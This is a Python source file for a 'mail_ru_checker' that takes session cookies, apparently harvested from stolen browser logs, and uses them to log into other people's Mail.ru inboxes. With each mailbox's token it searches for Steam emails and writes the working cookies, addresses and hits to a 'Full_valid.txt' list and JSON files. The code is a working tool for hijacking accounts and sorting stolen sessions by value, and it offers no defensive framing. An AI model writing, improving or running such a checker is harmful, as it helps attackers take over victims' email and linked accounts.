# -*- coding: utf-8 -*-
import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
class mail_ru_checker():


    @staticmethod
    def create_all_list_log(path_log: str, cook: str, path: str, email: str, nick: str, search: dict):
        with open(path_log, 'a', encoding='utf-8') as file:
            file.write(f'Email: {email} | Nick: {nick} | Your-search: {",".join(search)}\n'
                       f'Cookie: {cook}\n'
                       f'{path}' + "\n\n")

    @staticmethod
    def create_file(create_path: str, cook: str, path: str, email: str, nick: str, search: dict):
        path_name = email.replace('\\', '').replace('/', '').replace('?', '').replace('<', '').replace('>', '').replace('|', '')
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Email': email,
                'Nick': nick,
                'Your-search': search
            }
        }
        try:
            with open(f'{create_path}\\{path_name} - {search}.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
        except:
            with open(f'{create_path}\\{cook[:7:]}.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)

    @staticmethod
    def checker(dict, account, path_log):
        headers = StandartMethod.StandartMetod.get_headers()
        StandartMethod.StandartMetod.create_file_all_list(f'{dict}')
        try:
            cook = {"Mpop": account['Mpop'],
                    's': 'fver=0|ww=1920|wh=915|octavius=1',
                    'sdcs': account['sdcs']}
            log = f'Mpop={account["Mpop"]};s=fver=0|ww=1920|wh=915|octavius=1;sdcs={account["sdcs"]}'
            req = requests.get('https://e.mail.ru/inbox/?afterReload=1', cookies=cook,headers=headers)

            token = re.findall(r"\"token\":\"(.*?)\"", req.text)[0].strip()
            email = re.findall(r"\"email\":\"(.*?)\"", req.text)[0].strip()
            nick = re.findall(r"\"nick\":\"(.*?)\"", req.text)[0].strip()
            search = ['noreply@steampowered.com']
            find = {}
            for element in search:
                req = requests.get(
                    f'https://e.mail.ru/api/v1/k8s/messages/search?query={element}\&in_excluded_folders=false&offset=0&limit=9999&extra_suggest_search=true&with_threads=true&all_attaches=true&email={email}&htmlencoded=false&token={token}&_=1644041237786',
                    cookies=cook)
                message = req.json()['body']['messages']

                for i in message:
                    find[i['correspondents']['from'][0]['email']] = len(message)

            mail_ru_checker.create_file(f'{dict}',log, path_log , email, nick, find)
            mail_ru_checker.create_all_list_log(f'{dict}\\Full_valid.txt',log, path_log, email, nick, find)


        except Exception as ex:
            pass